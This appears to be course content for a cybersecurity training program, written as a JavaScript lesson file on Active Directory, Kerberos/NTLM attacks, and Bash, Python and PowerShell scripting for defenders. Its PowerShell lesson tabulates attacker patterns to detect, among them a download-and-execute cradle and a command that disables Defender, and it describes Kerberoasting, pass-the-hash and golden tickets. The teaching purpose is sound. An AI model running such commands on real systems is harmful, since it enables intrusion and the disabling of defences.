<pre><code>PS&gt; Get-ADGroupMember "Domain Admins" -Recursive | Select-Object Name,SamAccountName
PS&gt; Get-ADUser -Filter 'Enabled -eq $true' -Properties LastLogonDate |
      Where-Object LastLogonDate -lt (Get-Date).AddDays(-90)     # stale accounts
C:\\&gt; net group "Domain Admins" /domain</code></pre>

<h3>Group Policy</h3>
<p>A <b>Group Policy Object (GPO)</b> is a collection of settings — password policy, audit policy, firewall rules, software restrictions, drive mappings, scripts — linked to a site, domain or OU. Computer settings apply at boot and refresh; user settings apply at logon.</p>
<h4>Processing order: LSDOU</h4>
<ol>
<li><b>L</b>ocal policy on the machine</li>
<li><b>S</b>ite-linked GPOs</li>
<li><b>D</b>omain-linked GPOs</li>
<li><b>O</b>U-linked GPOs, from parent OU down to the child OU</li>
</ol>
<p>Later policies win when settings conflict, so the OU closest to the object usually wins. Two modifiers change that: <b>Block Inheritance</b> on an OU stops higher GPOs applying, and <b>Enforced</b> on a GPO link makes it apply and win regardless. <b>Security filtering</b> and WMI filters narrow which users/computers a GPO applies to. Clients refresh policy about every 90 minutes (plus a random 0–30 minute offset); DCs every 5 minutes.</p>
<pre><code>C:\\&gt; gpupdate /force          # refresh policy now
C:\\&gt; gpresult /r              # which GPOs applied to this user/computer
C:\\&gt; gpresult /h report.html  # full HTML report
# Management console: gpmc.msc</code></pre>
<div class="callout tip">Note one quirk: the domain password and account lockout policy for normal domain accounts comes from GPOs linked at the <b>domain</b> level (usually the Default Domain Policy). For different policies per group, use Fine-Grained Password Policies (Password Settings Objects).</div>
<div class="callout warn">Attackers who can edit a GPO can push a malicious scheduled task or script to every computer it applies to — a fast way to deploy ransomware domain-wide (ATT&amp;CK T1484.001). Monitor GPO changes (Event ID 5136 on DCs with directory service change auditing) and tightly control who has edit rights.</div>

<h3>AD in a cloud world: Microsoft Entra ID</h3>
<p><b>Microsoft Entra ID</b> (formerly Azure AD) is a cloud identity service for Microsoft 365, Azure and SaaS apps. It speaks modern protocols (OAuth 2.0, OpenID Connect, SAML) rather than Kerberos/LDAP, has no OUs or GPOs (devices are managed with Intune), and adds Conditional Access. Most organizations are <b>hybrid</b>: Entra Connect (or Cloud Sync) synchronizes on-prem AD users to Entra ID. Compromise can flow both ways, which is why the sync server is treated as a Tier 0 asset.</p>
<div class="callout real"><b>On the job:</b> defenders use <b>BloodHound</b> (the same tool attackers use) and PingCastle/Purple Knight assessments to find attack paths — chains like "helpdesk group can reset password of user X, who is local admin on server Y, where a Domain Admin is logged on". Removing these paths is some of the highest-value hardening work in any enterprise.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 (220-1102) objective 2.x covers Active Directory basics (domain, OU, login script, Group Policy, security groups). Security+ SY0-701 objective 4.5 covers Group Policy as a hardening tool and 4.6 covers identity and access management, including directory services.</div>`,
  keyTerms: [
    ["Domain Controller", "Server hosting AD DS that authenticates users and stores NTDS.dit"],
    ["Forest", "Collection of domains sharing a schema; the AD security boundary"],
    ["Organizational Unit", "AD container for organizing objects, delegation and GPO links"],
    ["GPO", "Group Policy Object: a set of settings applied to users/computers"],
    ["LSDOU", "GPO processing order: Local, Site, Domain, OU (last wins)"],
    ["Enforced / Block Inheritance", "Modifiers that force a GPO to apply or stop inherited GPOs"],
    ["krbtgt", "AD account whose key encrypts and signs Kerberos TGTs"],
    ["Tiered administration", "Separating admin credentials by asset tier to limit credential theft"],
    ["Microsoft Entra ID", "Microsoft's cloud identity platform (formerly Azure AD)"]
  ],
  standards: ["MITRE ATT&CK T1484.001", "MITRE ATT&CK T1003.006"]
},
{
  id: "p0-m4-l4",
  module: "p0-m4",
  title: "Windows Authentication: Kerberos and NTLM",
  minutes: 22,
  objectives: [
    "Walk through the Kerberos AS, TGS and AP exchanges",
    "Explain how NTLM challenge-response works and why it is weaker",
    "Describe Kerberoasting, AS-REP roasting, pass-the-hash and golden tickets",
    "Map these attacks to the Event IDs that detect them"
  ],
  html: `<p>Every time someone in a Windows domain opens a file share, connects to SQL Server or logs on to a PC, either Kerberos or NTLM is doing the authentication behind the scenes. Many of the best-known Active Directory attacks are simply abuses of how these protocols work. Understanding the flow is what lets you read 4768/4769/4776 events intelligently.</p>

<h3>Kerberos (the default in AD)</h3>
<p>Kerberos v5 (RFC 4120) is a ticket-based protocol using a trusted third party, the <b>Key Distribution Center (KDC)</b> — in AD, every domain controller runs one. The user's password never crosses the network; instead, keys derived from passwords encrypt tickets and timestamps.</p>
<ol>
<li><b>AS-REQ / AS-REP</b> (Authentication Service): the client sends a request with a timestamp encrypted with the user's key (this is <b>pre-authentication</b>). The KDC verifies it and returns a <b>Ticket-Granting Ticket (TGT)</b>, encrypted with the <b>krbtgt</b> account's key. <i>Logged as 4768 on the DC.</i></li>
<li><b>TGS-REQ / TGS-REP</b> (Ticket-Granting Service): to reach a service, e.g. <code>cifs/fileserver01</code>, the client presents its TGT and asks for a <b>service ticket</b>, which the KDC encrypts with the <b>service account's key</b>. Services are identified by a <b>Service Principal Name (SPN)</b>. <i>Logged as 4769.</i></li>
<li><b>AP-REQ</b>: the client presents the service ticket to the server, which decrypts it with its own key and reads the user's group memberships (in the PAC). The DC is not contacted again.</li>
</ol>
<pre><code>C:\\&gt; klist                     # tickets cached in your session
C:\\&gt; setspn -L svc_sql         # SPNs registered to an account</code></pre>
<p>Kerberos requires clocks to agree within <b>5 minutes</b> by default (timestamps prevent replay) and relies on DNS names — connecting by IP address often falls back to NTLM.</p>

<h3>NTLM (the legacy fallback)</h3>
<p>NTLM is a challenge-response protocol: the server sends a random challenge, the client returns a response computed from the challenge and the user's <b>NT hash</b> (an unsalted MD4 hash of the password), and the server (or the DC, via 4776) checks it. Weaknesses:</p>
<ul>
<li>The NT hash is effectively the password: anyone who steals it can authenticate (<b>pass-the-hash</b>).</li>
<li>Responses can be <b>relayed</b> to another server (NTLM relay) unless SMB signing, LDAP signing/channel binding or Extended Protection for Authentication are enforced.</li>
<li>No mutual authentication and weak legacy variants: NTLMv1 is crackable quickly.</li>
</ul>
<p>Microsoft formally deprecated NTLM in 2024; NTLMv1 is removed from Windows 11 24H2 and Windows Server 2025, and Microsoft is steering everything toward Kerberos (including new IAKerb and local KDC features). In practice NTLM is still everywhere, so auditing NTLM usage (Group Policy "Network security: Restrict NTLM" audit settings) is a common project.</p>

<h3>Attacks and how they show up</h3>
<table>
<tr><th>Attack</th><th>How it works</th><th>Detection hints</th></tr>
<tr><td><b>Kerberoasting</b> (T1558.003)</td><td>Any domain user requests service tickets for accounts with SPNs, then cracks them offline to recover the service account's password</td><td>Bursts of 4769 from one user for many SPNs, especially with ticket encryption type 0x17 (RC4); honeypot SPN accounts</td></tr>
<tr><td><b>AS-REP roasting</b> (T1558.004)</td><td>Accounts with "Do not require Kerberos pre-authentication" return crackable AS-REPs to anyone</td><td>4768 with pre-auth type 0; audit for the flag</td></tr>
<tr><td><b>Password spraying</b> (T1110.003)</td><td>A few common passwords against many accounts</td><td>Many 4771 (Kerberos) or 4625/4776 failures across many users from one source</td></tr>
<tr><td><b>Pass-the-hash</b> (T1550.002)</td><td>Reuses a stolen NT hash for NTLM authentication</td><td>4624 logon type 3 with NTLM from unusual hosts; type 9 with seclogo</td></tr>
<tr><td><b>Pass-the-ticket</b> (T1550.003)</td><td>Reuses a stolen Kerberos ticket</td><td>Tickets used from hosts other than where they were issued (EDR/MDI)</td></tr>
<tr><td><b>Golden ticket</b> (T1558.001)</td><td>Forges TGTs using the stolen krbtgt key — total domain persistence</td><td>Anomalous ticket lifetimes, 4769 without matching 4768; requires resetting krbtgt <b>twice</b> to evict</td></tr>
<tr><td><b>Silver ticket</b> (T1558.002)</td><td>Forges service tickets with a service account's key</td><td>Service access with no corresponding DC ticket events</td></tr>
<tr><td><b>DCSync</b> (T1003.006)</td><td>Abuses replication rights to pull password hashes from a DC</td><td>4662 with replication GUIDs from a non-DC account</td></tr>
</table>
<div class="callout real"><b>On the job — defenses that actually work:</b> give service accounts long random passwords or use <b>group Managed Service Accounts (gMSA)</b>, which rotate 120-character passwords automatically (defeating Kerberoasting cracking); remove RC4 and require AES for Kerberos (Microsoft is phasing RC4 out of Kerberos defaults); add admins to <b>Protected Users</b>; enable <b>Credential Guard</b> (on by default on many Windows 11 Enterprise devices) to protect LSASS secrets; enforce SMB and LDAP signing; and deploy identity threat detection such as Microsoft Defender for Identity.</div>
<div class="callout tip">Remember the encryption keys: TGTs are encrypted with <b>krbtgt</b>'s key, service tickets with the <b>service account's</b> key. Almost every Kerberos attack is "steal or crack one of those keys".</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.6 lists Kerberos, LDAP and SSO; 2.4 covers password and credential-replay attacks (pass-the-hash, spraying). CISSP Domain 5 (Phase 5) revisits Kerberos in depth — know the KDC, AS, TGS, TGT and the 5-minute clock skew.</div>`,
  keyTerms: [
    ["Kerberos", "Ticket-based authentication protocol using a trusted KDC (RFC 4120)"],
    ["KDC", "Key Distribution Center; runs on every AD domain controller"],
    ["TGT", "Ticket-Granting Ticket, encrypted with the krbtgt key"],
    ["Service ticket (TGS)", "Ticket for a specific SPN, encrypted with the service account's key"],
    ["SPN", "Service Principal Name identifying a Kerberos service, e.g. MSSQLSvc/db01"],
    ["NTLM", "Legacy challenge-response protocol based on the unsalted NT hash"],
    ["Pass-the-hash", "Authenticating with a stolen NT hash instead of the password"],
    ["Kerberoasting", "Requesting service tickets and cracking them offline for service account passwords"],
    ["Golden ticket", "Forged TGT created with the krbtgt key"],
    ["gMSA", "Group Managed Service Account with automatically rotated long passwords"]
  ],
  standards: ["RFC 4120", "MITRE ATT&CK T1558", "MITRE ATT&CK T1550.002"],
  labs: ["lab-windows-events"]
}
);

// ===================== p0-m5 Scripting for Security =====================
CP.lessons.push(
{
  id: "p0-m5-l1",
  module: "p0-m5",
  title: "Bash Scripting for Analysts",
  minutes: 18,
  objectives: [
    "Write a Bash script with a shebang, variables, arguments and exit codes",
    "Use conditionals and loops to automate repetitive checks",
    "Build a reusable failed-login report script",
    "Apply safe scripting habits (quoting, set -euo pipefail, no secrets in scripts)"
  ],
  html: `<p>If you type the same five commands every morning, you should be running one script instead. Bash scripts glue together the Linux tools you learned in p0-m3 into repeatable checks — a daily SSH brute-force report, a hash-and-collect script for incident response, a loop that checks a list of IPs against a blocklist. Scripting is also a top differentiator on entry-level resumes.</p>

<h3>Anatomy of a script</h3>
<pre><code>#!/usr/bin/env bash
# ssh_report.sh - summarize failed SSH logins
set -euo pipefail          # stop on errors, undefined variables and failed pipes

LOG="/var/log/auth.log"
TOP=10

echo "Failed SSH logins in $LOG on $(hostname) at $(date -u +%FT%TZ)"
grep "Failed password" "$LOG" | grep -oE 'from [0-9.]+' | awk '{print $2}' \\
  | sort | uniq -c | sort -rn | head -n "$TOP"</code></pre>
<pre><code>$ chmod +x ssh_report.sh
$ ./ssh_report.sh</code></pre>
<ul>
<li>The <b>shebang</b> (<code>#!/usr/bin/env bash</code>) tells the OS which interpreter to use.</li>
<li>Variables are assigned with no spaces (<code>TOP=10</code>) and read with <code>$TOP</code>. <b>Always double-quote</b> variables (<code>"$LOG"</code>) so spaces or wildcards in values cannot break — or inject into — your commands.</li>
<li><code>$(command)</code> is command substitution: it inserts a command's output.</li>
<li><code>set -euo pipefail</code> makes scripts fail loudly instead of silently continuing after an error.</li>
</ul>

<h3>Arguments and exit codes</h3>
<p><code>$1</code>, <code>$2</code>… are positional arguments, <code>$#</code> is their count and <code>$@</code> is all of them. Every command returns an <b>exit code</b> in <code>$?</code>: 0 means success, anything else means failure. <code>grep</code> returns 1 when it finds nothing, which matters with <code>set -e</code>.</p>
<pre><code>if [ "$#" -lt 1 ]; then
  echo "Usage: $0 &lt;logfile&gt;" &gt;&amp;2
  exit 2
fi
LOG="$1"
[ -r "$LOG" ] || { echo "Cannot read $LOG" &gt;&amp;2; exit 1; }</code></pre>

<h3>Conditionals</h3>
<pre><code>count=$(grep -c "Failed password" "$LOG" || true)
if [ "$count" -gt 100 ]; then
  echo "ALERT: $count failed logins"
elif [ "$count" -gt 0 ]; then
  echo "Info: $count failed logins"
else
  echo "No failures"
fi</code></pre>
<table>
<tr><th>Test</th><th>True when</th></tr>
<tr><td><code>-f file</code> / <code>-d dir</code></td><td>Regular file / directory exists</td></tr>
<tr><td><code>-r</code>, <code>-w</code>, <code>-x</code></td><td>Readable, writable, executable</td></tr>
<tr><td><code>-z "$s"</code> / <code>-n "$s"</code></td><td>String empty / non-empty</td></tr>
<tr><td><code>"$a" = "$b"</code></td><td>Strings equal</td></tr>
<tr><td><code>-eq -ne -lt -le -gt -ge</code></td><td>Integer comparisons</td></tr>
</table>

<h3>Loops</h3>
<pre><code># Check each IP in a file against a blocklist
while read -r ip; do
  if grep -qx "$ip" blocklist.txt; then
    echo "BLOCKLISTED: $ip"
  fi
done &lt; suspicious_ips.txt

# Hash every file in a collection folder for the case record
for f in /cases/IR-1042/files/*; do
  sha256sum "$f"
done &gt; /cases/IR-1042/hashes.sha256

# Count from 1 to 5
for i in $(seq 1 5); do echo "attempt $i"; done</code></pre>

<h3>A practical triage collector</h3>
<pre><code>#!/usr/bin/env bash
# collect.sh - gather volatile info into a timestamped folder (run as root)
set -uo pipefail
OUT="/tmp/triage_$(hostname)_$(date -u +%Y%m%dT%H%M%SZ)"
mkdir -p "$OUT"

run() {               # run a command and save its output under a name
  local name="$1"; shift
  "$@" &gt; "$OUT/$name.txt" 2&gt;&amp;1
}
run who        w
run processes  ps -eo pid,ppid,user,lstart,cmd --forest
run sockets    ss -tunap
run services   systemctl list-units --type=service --all
run cron       ls -la /etc/cron.d /etc/cron.daily /var/spool/cron
run logins     last -Faiw
run tmpfiles   find /tmp /var/tmp /dev/shm -type f -ls

tar -czf "$OUT.tar.gz" -C /tmp "$(basename "$OUT")"
sha256sum "$OUT.tar.gz"</code></pre>
<p>Hashing the archive gives you an integrity value for chain-of-custody notes: anyone can later verify the evidence was not altered.</p>
<div class="callout warn"><b>Safety rules:</b> never hard-code passwords or API keys in scripts (use environment variables or a secrets manager — and remember <code>.bash_history</code> records commands you type); quote every variable; test scripts on a lab VM before running them on production; and do not pipe random internet scripts into <code>bash</code> (<code>curl ... | bash</code>) without reading them — attackers use exactly that pattern.</div>
<div class="callout tip">Run <b>ShellCheck</b> (<code>shellcheck script.sh</code>) on everything you write. It catches unquoted variables, typos and portability problems, and its explanations teach you Bash along the way.</div>
<div class="callout real"><b>On the job:</b> schedule a script with cron (<code>crontab -e</code>, e.g. <code>0 7 * * * /opt/scripts/ssh_report.sh | mail -s "SSH report" soc@example.com</code>) and you have built your first automated detection. In a SOC, this grows into SOAR playbooks — but the logic is the same.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 (220-1102) objective 4.8 "Identify the basics of scripting" (.sh, .bat, .ps1, .py, .js, .vbs; use cases and risks). Security+ SY0-701 objective 4.7 "Explain the importance of automation and orchestration" (use cases, benefits, and considerations such as complexity and technical debt).</div>`,
  keyTerms: [
    ["Shebang", "First line (#!) naming the interpreter for a script"],
    ["Exit code", "Numeric status a command returns; 0 = success"],
    ["Command substitution", "$(command) inserts a command's output"],
    ["Positional parameters", "$1, $2 ... arguments passed to a script; $# counts them"],
    ["set -euo pipefail", "Bash options that make scripts stop on errors"],
    ["Quoting", "Wrapping variables in double quotes to prevent word splitting and injection"],
    ["cron", "Scheduler for running scripts at set times"],
    ["ShellCheck", "Static analysis tool for shell scripts"]
  ],
  standards: ["POSIX.1-2024 (Shell and Utilities)"],
  labs: ["lab-linux-terminal"]
},
{
  id: "p0-m5-l2",
  module: "p0-m5",
  title: "Python for Log Parsing and Security Automation",
  minutes: 22,
  objectives: [
    "Read files line by line and extract fields with regular expressions",
    "Count and rank results with collections.Counter",
    "Parse CSV and JSON logs and write structured output",
    "Call a REST API safely (e.g. threat-intel enrichment) with error handling"
  ],
  html: `<p>Bash pipelines are perfect for quick questions. When logic gets more complicated — joining two data sources, parsing JSON from a cloud API, calculating time windows, calling a threat-intel service — Python is the standard language of security automation. You only need a small subset to be productive.</p>

<h3>Setup</h3>
<pre><code>$ python3 --version             # use Python 3.11+ (3.9 and older are end-of-life)
$ python3 -m venv .venv &amp;&amp; source .venv/bin/activate
$ pip install requests</code></pre>
<p>A <b>virtual environment</b> keeps each project's packages separate — and limits the blast radius of a malicious package. Typosquatted packages on PyPI are a real supply-chain threat, so check names carefully.</p>

<h3>Parsing auth.log: failed logins per IP</h3>
<pre><code>#!/usr/bin/env python3
"""Count failed SSH logins by source IP and username."""
import re
import sys
from collections import Counter

PATTERN = re.compile(
    r"Failed password for (?:invalid user )?(?P&lt;user&gt;\\S+) "
    r"from (?P&lt;ip&gt;\\d{1,3}(?:\\.\\d{1,3}){3}) port (?P&lt;port&gt;\\d+)"
)

def parse(path):
    by_ip, by_user = Counter(), Counter()
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:                       # streams the file; works on huge logs
            m = PATTERN.search(line)
            if m:
                by_ip[m["ip"]] += 1
                by_user[m["user"]] += 1
    return by_ip, by_user

if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) &gt; 1 else "/var/log/auth.log"
    ips, users = parse(path)
    print("Top source IPs:")
    for ip, n in ips.most_common(10):
        print(f"  {ip:15}  {n}")
    print("Top targeted users:")
    for user, n in users.most_common(10):
        print(f"  {user:15}  {n}")</code></pre>
<p>Key ideas: <code>re.compile</code> once, outside the loop; <b>named groups</b> (<code>?P&lt;ip&gt;</code>) make code readable; iterating over the file object reads one line at a time instead of loading gigabytes into memory; <code>errors="replace"</code> stops odd bytes from crashing the parser; and <code>Counter.most_common()</code> does the sort-and-rank for you.</p>

<h3>Adding logic Bash struggles with: brute force followed by success</h3>
<pre><code>from collections import defaultdict
ACCEPT = re.compile(r"Accepted \\S+ for (?P&lt;user&gt;\\S+) from (?P&lt;ip&gt;[\\d.]+)")

failures = defaultdict(int)
alerts = []
with open("auth.log", encoding="utf-8", errors="replace") as fh:
    for line in fh:
        if (m := PATTERN.search(line)):
            failures[m["ip"]] += 1
        elif (m := ACCEPT.search(line)):
            if failures[m["ip"]] &gt;= 10:
                alerts.append((m["ip"], m["user"], failures[m["ip"]]))

for ip, user, n in alerts:
    print(f"ALERT: {ip} logged in as {user} after {n} failures")</code></pre>
<p>That is a real detection rule — the same logic you will later write in a SIEM query language.</p>

<h3>CSV and JSON</h3>
<p>Many tools export CSV, and nearly every cloud and EDR API speaks JSON (often one JSON object per line, "JSONL").</p>
<pre><code>import csv, json

# CSV: firewall export with columns time,src,dst,dport,action
with open("fw.csv", newline="") as fh:
    denied = [row for row in csv.DictReader(fh) if row["action"] == "deny"]
print(len(denied), "denied connections")

# JSON Lines: e.g. cloud audit logs
with open("cloudtrail.jsonl") as fh:
    for line in fh:
        event = json.loads(line)
        if event.get("eventName") == "ConsoleLogin" and \\
           event.get("responseElements", {}).get("ConsoleLogin") == "Failure":
            print(event["eventTime"], event.get("sourceIPAddress"))

# Write results for the next tool or a report
with open("alerts.json", "w") as fh:
    json.dump([{"ip": i, "user": u, "failures": n} for i, u, n in alerts], fh, indent=2)</code></pre>
<div class="callout tip">Use <code>dict.get("key", default)</code> rather than <code>dict["key"]</code> when parsing logs: real-world records are messy and fields go missing. A single <code>KeyError</code> at 3 a.m. can silently stop your automation.</div>

<h3>Calling an API for enrichment</h3>
<pre><code>import os, requests

API_KEY = os.environ["INTEL_API_KEY"]          # never hard-code secrets
def lookup(ip):
    try:
        r = requests.get(
            f"https://intel.example.com/api/v1/ip/{ip}",
            headers={"Authorization": f"Bearer {API_KEY}"},
            timeout=10,
        )
        r.raise_for_status()
        return r.json()
    except requests.RequestException as exc:
        return {"error": str(exc)}</code></pre>
<p>Real services you may use this way include AbuseIPDB, VirusTotal, GreyNoise, Shodan and your SIEM's own API. Respect rate limits, set timeouts, and never send sensitive internal data (internal hostnames, user data, file contents) to public services without approval.</p>
<div class="callout warn">Never use <code>eval()</code> or <code>exec()</code> on log content, and avoid <code>subprocess</code> with <code>shell=True</code> on untrusted input — attackers can plant crafted strings in logs (for example in a User-Agent header) precisely to exploit the tools that analyze them.</div>
<div class="callout real"><b>On the job:</b> Python is the language of SOAR playbooks, detection-as-code pipelines, Jupyter notebooks for threat hunting, and tools you will use like Volatility 3, Impacket and many DFIR parsers. Put your scripts in a GitHub repository with a README — it doubles as a portfolio.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 objective 4.8 (scripting file types and use cases). Security+ SY0-701 objective 4.7 (automation and scripting: user provisioning, ticket creation, enabling/disabling services, guard rails) and 4.9 (using log data).</div>`,
  keyTerms: [
    ["Regular expression (re)", "Python module for pattern matching in text"],
    ["Named group", "A regex group given a name with the ?P syntax so it can be read by name"],
    ["Counter", "collections class that counts hashable items and ranks with most_common()"],
    ["JSON Lines", "One JSON object per line; common for log exports"],
    ["Virtual environment", "Isolated Python package environment per project (venv)"],
    ["REST API", "HTTP-based interface returning structured data, usually JSON"],
    ["Enrichment", "Adding context (reputation, geo, owner) to raw indicators"],
    ["Supply-chain attack", "Compromise through a dependency, e.g. a typosquatted package"]
  ],
  standards: ["RFC 8259", "RFC 4180"],
  labs: ["lab-linux-terminal"]
},
{
  id: "p0-m5-l3",
  module: "p0-m5",
  title: "PowerShell for Defenders",
  minutes: 22,
  objectives: [
    "Use the PowerShell object pipeline with Get-, Where-Object, Select-Object and Sort-Object",
    "Query event logs efficiently with Get-WinEvent -FilterHashtable",
    "Collect process, network, service and persistence information for triage",
    "Explain execution policy, logging and why attackers abuse PowerShell"
  ],
  html: `<p>PowerShell is Windows' built-in automation shell and is installed on every modern Windows system. Administrators use it to manage everything from Active Directory to Microsoft 365; attackers use it because it is powerful, trusted and already present ("living off the land"). Defenders need to be fluent in it for exactly both reasons.</p>

<h3>Objects, not text</h3>
<p>Unlike Bash, PowerShell pipes <b>objects</b> with properties. You filter and select by property name instead of cutting columns. Commands (cmdlets) follow a <b>Verb-Noun</b> pattern.</p>
<pre><code>PS&gt; Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending |
      Select-Object -First 5 Name, Id, CPU, Path

PS&gt; Get-Command -Noun *Event*        # discover commands
PS&gt; Get-Help Get-WinEvent -Examples  # built-in examples
PS&gt; Get-Process -Id 4242 | Get-Member  # see every property and method</code></pre>
<p><code>$_</code> (or <code>$PSItem</code>) is the current object in a script block: <code>Where-Object { $_.Path -like '*\\AppData\\*' }</code>. PowerShell 7 (pwsh) is the current cross-platform version; Windows PowerShell 5.1 still ships in Windows and is what you will find on most endpoints.</p>

<h3>Event logs at speed</h3>
<p><code>Get-WinEvent -FilterHashtable</code> filters at the source and is far faster than piping everything into <code>Where-Object</code>.</p>
<pre><code># Failed logons in the last 24 hours, grouped by target user and source IP
$since = (Get-Date).AddHours(-24)
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=$since} -ErrorAction SilentlyContinue

$rows = foreach ($e in $events) {
    $x = [xml]$e.ToXml()
    $d = @{}
    foreach ($n in $x.Event.EventData.Data) { $d[$n.Name] = $n.'#text' }
    [pscustomobject]@{
        Time      = $e.TimeCreated
        User      = $d['TargetUserName']
        SourceIP  = $d['IpAddress']
        LogonType = $d['LogonType']
        SubStatus = $d['SubStatus']
    }
}
$rows | Group-Object SourceIP | Sort-Object Count -Descending |
    Select-Object -First 10 Count, Name</code></pre>
<p>Converting each event to XML and reading <code>EventData</code> by field name is more robust than indexing into <code>$e.Properties[n]</code>, whose positions differ per Event ID.</p>
<pre><code># Other useful one-liners
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 20 |
    Select-Object TimeCreated, Message                       # new services
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 50 |
    Where-Object Message -match 'DownloadString|FromBase64String|Invoke-Expression|IEX'
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102}  # log cleared</code></pre>

<h3>Live triage collection</h3>
<pre><code># Processes with parent, path and command line
Get-CimInstance Win32_Process |
    Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine |
    Export-Csv procs.csv -NoTypeInformation

# Network connections joined to process names
Get-NetTCPConnection -State Established | ForEach-Object {
    [pscustomobject]@{
        Local   = "$($_.LocalAddress):$($_.LocalPort)"
        Remote  = "$($_.RemoteAddress):$($_.RemotePort)"
        PID     = $_.OwningProcess
        Process = (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name
    }
}

# Persistence
Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
Get-ScheduledTask | Where-Object State -ne 'Disabled' | Select-Object TaskPath, TaskName, Author
Get-CimInstance Win32_Service | Where-Object StartMode -eq 'Auto' | Select-Object Name, PathName, StartName

# Hash a suspicious file
Get-FileHash C:\\Users\\Public\\update.exe -Algorithm SHA256

# Local admins and recent local accounts
Get-LocalGroupMember Administrators
Get-LocalUser | Select-Object Name, Enabled, LastLogon</code></pre>
<p>Use <code>Invoke-Command -ComputerName HOST01 -ScriptBlock { ... }</code> (PowerShell Remoting over WinRM, 5985/5986) to run the same collection on remote machines.</p>

<h3>Execution policy is not a security boundary</h3>
<p>Execution policy (<code>Get-ExecutionPolicy</code>; values Restricted, AllSigned, RemoteSigned, Unrestricted, Bypass) prevents <i>accidental</i> script execution. Anyone can bypass it with <code>powershell -ExecutionPolicy Bypass</code>. Real controls are application control (<b>App Control for Business</b>, formerly WDAC, or AppLocker) which also forces <b>Constrained Language Mode</b>, plus logging and <b>AMSI</b> (the Antimalware Scan Interface that lets Defender inspect script content even after de-obfuscation).</p>

<h3>How attackers use PowerShell — and what you look for</h3>
<table>
<tr><th>Pattern</th><th>Meaning</th></tr>
<tr><td><code>-enc</code> / <code>-EncodedCommand</code></td><td>Base64 (UTF-16LE) encoded script hiding its content</td></tr>
<tr><td><code>-nop -w hidden -noni</code></td><td>No profile, hidden window, non-interactive</td></tr>
<tr><td><code>IEX (New-Object Net.WebClient).DownloadString(...)</code></td><td>Download-and-execute in memory ("cradle")</td></tr>
<tr><td><code>Invoke-WebRequest</code> / <code>iwr</code> to raw IPs or paste sites</td><td>Tool or payload download</td></tr>
<tr><td><code>-Version 2</code></td><td>Downgrade to PowerShell 2.0, which lacks AMSI and script block logging — remove the PS 2.0 feature</td></tr>
<tr><td><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></td><td>Disabling Defender</td></tr>
</table>
<div class="callout real"><b>On the job:</b> Script Block Logging (Event 4104) records the <i>de-obfuscated</i> code that actually ran, even when it was launched with <code>-enc</code>. Enabling it via Group Policy (Administrative Templates › Windows Components › Windows PowerShell) and forwarding the PowerShell/Operational log to your SIEM is one of the highest-value, lowest-cost detections you can deploy.</div>
<div class="callout warn">Do not decode an attacker's command by running it. Decode safely: <code>[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))</code> only <i>prints</i> the text — never pipe it into <code>Invoke-Expression</code>.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 objective 4.8 (.ps1 scripting basics and risks). Security+ SY0-701 objective 2.4 (malicious code indicators) and 4.7 (automation). SC-200 and CySA+ expect you to read PowerShell attack commands and logs.</div>`,
  keyTerms: [
    ["Cmdlet", "A PowerShell command in Verb-Noun form, e.g. Get-WinEvent"],
    ["Object pipeline", "Passing structured objects (not text) between commands"],
    ["FilterHashtable", "Get-WinEvent parameter that filters events efficiently at the source"],
    ["Execution policy", "Setting that limits script running; not a security boundary"],
    ["AMSI", "Antimalware Scan Interface letting AV inspect script content at runtime"],
    ["Script Block Logging", "Records executed PowerShell code (Event ID 4104)"],
    ["Constrained Language Mode", "Restricted PowerShell mode enforced by application control"],
    ["Living off the land", "Using built-in, trusted tools (PowerShell, WMI, certutil) for attacks"],
    ["PowerShell Remoting", "Running commands on remote hosts over WinRM"]
  ],
  standards: ["MITRE ATT&CK T1059.001", "MITRE ATT&CK T1027"],
  labs: ["lab-powershell-triage", "lab-windows-events"]
}
);

// ===================== p1-m1 Core Security Concepts =====================
CP.lessons.push(
{
  id: "p1-m1-l1",
  module: "p1-m1",
  title: "The CIA Triad, AAA and Non-Repudiation",
  minutes: 15,
  objectives: [
    "Define confidentiality, integrity and availability with real examples",
    "Explain the DAD triad as the attacker's opposite of CIA",
    "Describe authentication, authorization and accounting (AAA)",
    "Explain non-repudiation and the controls that provide it"
  ],
  html: `<p>Every security decision — buying a firewall, writing a policy, escalating an alert — ultimately protects one or more of three properties. The <b>CIA triad</b> is the oldest model in the field and still the first lens to apply to any situation: <i>what is at risk here, and which property would be harmed?</i></p>

<h3>Confidentiality</h3>
<p>Only authorized people, processes and systems can read the information. Breaches of confidentiality are what make headlines: stolen customer databases, leaked source code, exposed cloud storage buckets.</p>
<ul>
<li><b>Controls:</b> encryption at rest and in transit, access control and least privilege, MFA, data classification and DLP, masking/tokenization, physical security, privacy screens.</li>
<li><b>Example:</b> a misconfigured public storage bucket exposes payroll files — a confidentiality failure even if nobody changed anything.</li>
</ul>

<h3>Integrity</h3>
<p>Data and systems are accurate, complete and changed only in authorized ways. Integrity failures can be subtle and dangerous: a modified bank account number on an invoice, a tampered software update, an altered log entry hiding an intrusion.</p>
<ul>
<li><b>Controls:</b> hashing (SHA-256) and digital signatures, file-integrity monitoring, version control, input validation, write-once (WORM) storage for logs and backups, change management.</li>
<li><b>Example:</b> the 2020 SolarWinds Orion compromise inserted malicious code into a signed software update — an integrity attack on the supply chain.</li>
</ul>

<h3>Availability</h3>
<p>Systems and data are accessible to authorized users when needed. A hospital whose records system is encrypted by ransomware has suffered an availability failure that can endanger lives.</p>
<ul>
